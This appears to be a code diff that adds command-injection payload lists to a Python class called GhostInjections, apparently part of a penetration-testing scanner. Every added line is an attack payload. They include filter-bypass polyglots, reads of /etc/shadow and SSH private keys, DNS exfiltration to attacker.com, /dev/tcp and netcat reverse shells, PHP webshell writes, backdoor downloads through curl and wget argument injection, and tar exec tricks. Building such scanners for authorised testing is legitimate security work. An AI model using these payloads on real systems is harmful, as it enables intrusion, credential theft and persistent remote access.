@@ -497,6 +497,181 @@ class GhostInjections:
                 "%0a%0awhoami",
                 "%0a%0a%0awhoami",
             ],
+            # Polyglot payloads - work in multiple quote contexts
+            # Based on PayloadsAllTheThings polyglot research
+            "polyglot_injection": [
+                # Works in no quotes, single quotes, and double quotes
+                "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
+                # Polyglot with multiple command types
+                "/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
+                # Simple polyglot for whoami
+                "1;whoami;#${IFS}';whoami;#${IFS}\";whoami;#${IFS}",
+                # Polyglot with id
+                "1;id;#${IFS}';id;#${IFS}\";id;#${IFS}",
+                # Works with cat
+                "1;cat /etc/passwd;#${IFS}';cat /etc/passwd;#${IFS}\";cat /etc/passwd;#${IFS}",
+            ],
+            # Brace expansion (no spaces needed)
+            "brace_expansion": [
+                # Brace expansion for command execution
+                "{cat,/etc/passwd}",
+                "{ls,-la}",
+                "{id}",
+                "{whoami}",
+                "{pwd}",
+                "{uname,-a}",
+                # With paths
+                "{cat,/etc/hosts}",
+                "{cat,/etc/shadow}",
+                "{cat,/flag.txt}",
+                # Nested brace expansion
+                "{cat,/etc/{passwd,hosts}}",
+            ],
+            # Input redirection (no spaces needed)
+            "input_redirection": [
+                "cat</etc/passwd",
+                "cat</etc/hosts",
+                "cat</etc/shadow",
+                "cat</flag.txt",
+                "cat</var/log/auth.log",
+                "head</etc/passwd",
+                "tail</etc/passwd",
+                "grep<root</etc/passwd",
+                # With command output
+                "sh</dev/tcp/127.0.0.1/4242",
+            ],
+            # Hex encoding bypass (PayloadsAllTheThings)
+            "hex_encoding_bypass": [
+                # $'command\x20args' format bypasses space filters
+                "$'whoami'",
+                "$'id'",
+                "$'pwd'",
+                "$'ls\x20-la'",  # \x20 is hex for space
+                "$'cat\x20/etc/passwd'",
+                "$'uname\x20-a'",
+                # Store in variable and execute
+                "X=$'whoami'&&$X",
+                "X=$'id'&&$X",
+                "X=$'uname\x20-a'&&$X",
+                "X=$'cat\x20/etc/passwd'&&$X",
+            ],
+            # Windows-specific bypasses
+            "windows_bypass": [
+                # Windows substring bypass for spaces
+                # %PROGRAMFILES:~10,-5% extracts a space from environment variable
+                "ping%PROGRAMFILES:~10,-5%127.0.0.1",
+                "whoami%PROGRAMFILES:~10,-5%/all",
+                "ping%CommonProgramFiles:~10,-18%127.0.0.1",
+                # PowerShell execution
+                "powershell -Command whoami",
+                "powershell.exe -c whoami",
+                "powershell -NoProfile -Command id",
+                # CMD specific
+                "cmd /c whoami",
+                "cmd.exe /c whoami",
+                "cmd /k whoami",
+                # Windows path traversal
+                "type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "more C:\\boot.ini",
+            ],
+            # DNS exfiltration (blind command injection detection)
+            # Note: Requires attacker-controlled DNS server
+            "dns_exfiltration": [
+                # Basic DNS exfiltration
+                "nslookup $(whoami).attacker.com",
+                "host $(whoami).attacker.com",
+                "dig $(whoami).attacker.com",
+                # Exfiltrate file listing
+                "for i in $(ls /); do host $i.attacker.com; done",
+                # Exfiltrate command output
+                "host $(id|base64).attacker.com",
+                # Windows DNS exfiltration
+                "nslookup %USERNAME%.attacker.com",
+                "ping -n 1 $(whoami).attacker.com",
+            ],
+            # Quote context breaking
+            "quote_breaking": [
+                # Break out of single quotes
+                "';whoami;'",
+                "';whoami #",
+                "';id;'",
+                "';cat /etc/passwd;'",
+                # Break out of double quotes
+                "\";whoami;\"",
+                "\";whoami #",
+                "\";id;\"",
+                "\";cat /etc/passwd;\"",
+                # Break out of backticks
+                "`whoami`",
+                "`id`",
+                "`cat /etc/passwd`",
+                # Combined breaking
+                "';whoami||'",
+                "\";whoami||\"",
+            ],
+            # File descriptor exploitation
+            "file_descriptor_tricks": [
+                # Read files via file descriptors
+                "cat</etc/passwd",
+                "cat</etc/shadow",
+                "cat</root/.ssh/id_rsa",
+                # Reverse shells via /dev/tcp
+                "sh</dev/tcp/attacker.com/4242",
+                "bash</dev/tcp/attacker.com/4444",
+                "exec 5<>/dev/tcp/attacker.com/4444;cat <&5|bash>&5",
+                # Write webshells
+                "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/shell.php",
+                "cat > /tmp/shell.sh << EOF\n#!/bin/bash\nnc -e /bin/bash attacker.com 4444\nEOF",
+            ],
+            # Argument injection (for commands like curl, wget)
+            "argument_injection": [
+                # curl argument injection to write webshell
+                "-o /var/www/html/shell.php http://attacker.com/shell.php",
+                "--output /tmp/backdoor.sh http://attacker.com/backdoor.sh",
+                # wget argument injection
+                "-O /var/www/html/shell.php http://attacker.com/shell.php",
+                "--use-askpass=cmd.exe",  # Windows
+                # Full-width unicode bypass (worstfit technique)
+                "＂ --use-askpass=calc ＂",  # Full-width double quotes
+                # Tar argument injection
+                "--to-command=bash",
+                "--checkpoint=1 --checkpoint-action=exec=bash",
+            ],
+            # Background execution
+            "background_execution": [
+                # Execute in background with &
+                "whoami &",
+                "id &",
+                "nohup nc -e /bin/bash attacker.com 4444 &",
+                "nohup bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &",
+                # Using nohup to keep process running
+                "nohup sleep 100 &",
+                "nohup wget http://attacker.com/backdoor.sh -O /tmp/bd.sh; bash /tmp/bd.sh &",
+            ],
+            # Tab character variations (bypass space filters)
+            "tab_character_bypass": [
+                # Using literal tabs
+                ";ls\t-la",  # Tab between ls and -la
+                ";cat\t/etc/passwd",
+                ";id\t-a",
+                ";whoami",
+                # URL encoded tabs
+                ";ls%09-la",
+                ";cat%09/etc/passwd",
+                ";id%09-a",
+            ],
+            # Conditional time-based blind injection
+            "conditional_time_based": [
+                # Character-by-character extraction
+                "if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi",
+                "if [ $(whoami|cut -c 1) == w ]; then sleep 5; fi",
+                "if [ $(id|cut -c 1) == u ]; then sleep 5; fi",
+                # Check if user is root
+                "if [ $(id -u) == 0 ]; then sleep 5; fi",
+                # Check if file exists
+                "if [ -f /etc/passwd ]; then sleep 5; fi",
+                "if [ -f /flag.txt ]; then sleep 5; fi",
+            ],
         }
         
         # Comprehensive detection patterns
